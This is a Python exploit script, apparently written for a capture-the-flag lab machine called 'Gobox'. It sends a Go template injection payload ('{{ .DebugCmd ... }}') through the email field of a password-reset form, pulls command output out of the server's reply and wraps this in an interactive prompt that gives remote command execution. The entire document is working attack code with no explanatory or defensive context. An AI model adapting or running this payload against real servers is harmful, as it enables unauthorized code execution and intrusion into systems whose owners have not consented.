#!/usr/bin/python3

import signal, requests, pwn, sys, re

def exit_handler(sig, frame):
    print("\nExiting...\n")
    sys.exit(1)

# Controls Ctrl + C signal
signal.signal(signal.SIGINT, exit_handler)

targetURL = "http://10.10.11.113:8080/forgot/"

def makeRequest(command):
    
    data_request = {
        'email': 'dek@{{ .DebugCmd "%s" }}' % command
    }
    
    req = requests.post(targetURL, data = data_request)
    
    output = (re.findall('Email Sent To: (.*)\s+<button class', req.text, re.DOTALL)[0]).replace("dek@","")

    print(output)

if __name__ == '__main__':

    while True:
        command = input("Gobox> ")

        makeRequest(command)
